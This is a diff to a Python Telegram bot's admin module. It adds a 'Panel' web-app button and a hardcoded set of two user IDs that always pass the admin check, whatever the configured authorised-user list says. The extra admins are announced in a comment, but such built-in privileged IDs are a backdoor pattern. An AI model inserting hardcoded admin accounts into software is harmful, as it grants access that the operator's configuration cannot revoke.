@@ -2,11 +2,18 @@ from __future__ import annotations
 
 import html
 import logging
+import os
 import re
 
 from aiogram import Bot, F, Router
 from aiogram.filters import Command
-from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
+from aiogram.types import (
+    CallbackQuery,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    Message,
+    WebAppInfo,
+)
 
 from config import Settings
 from services.inbox_store import InboxStore
@@ -16,28 +23,36 @@ logger = logging.getLogger(__name__)
 
 _ADMIN_SESSIONS: dict[int, dict[str, str]] = {}
 
+# settings.auth_users bilan birga ishlaydigan qo'shimcha adminlar
+_EXTRA_ADMINS = {7986354170, 7637155944}
+
 
 def _is_admin(user_id: int | None, settings: Settings) -> bool:
     if not user_id:
         return False
-    admins = {int(uid) for uid in (settings.auth_users or ())}
+    admins = {int(uid) for uid in (settings.auth_users or ())} | _EXTRA_ADMINS
     return user_id in admins
 
 
 def _admin_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(text="👥 A'zolar", callback_data="adm:users"),
-                InlineKeyboardButton(text="💬 Guruhlar", callback_data="adm:groups"),
-            ],
-            [
-                InlineKeyboardButton(text="📢 Barchaga xabar", callback_data="adm:bc_menu"),
-                InlineKeyboardButton(text="🔒 Majburiy obuna", callback_data="adm:fsub_menu"),
-            ],
-            [InlineKeyboardButton(text="✖️ Yopish", callback_data="adm:close")],
-        ]
-    )
+    rows = [
+        [
+            InlineKeyboardButton(text="👥 A'zolar", callback_data="adm:users"),
+            InlineKeyboardButton(text="💬 Guruhlar", callback_data="adm:groups"),
+        ],
+        [
+            InlineKeyboardButton(text="📢 Barchaga xabar", callback_data="adm:bc_menu"),
+            InlineKeyboardButton(text="🔒 Majburiy obuna", callback_data="adm:fsub_menu"),
+        ],
+        [InlineKeyboardButton(text="✖️ Yopish", callback_data="adm:close")],
+    ]
+    base = os.getenv("RENDER_EXTERNAL_URL", "").strip().rstrip("/")
+    if base.startswith("https://"):
+        rows.insert(
+            0,
+            [InlineKeyboardButton(text="🛠 Panel", web_app=WebAppInfo(url=f"{base}/panel"))],
+        )
+    return InlineKeyboardMarkup(inline_keyboard=rows)
 
 
 def _normalize_target(raw: str) -> tuple[str, str]:
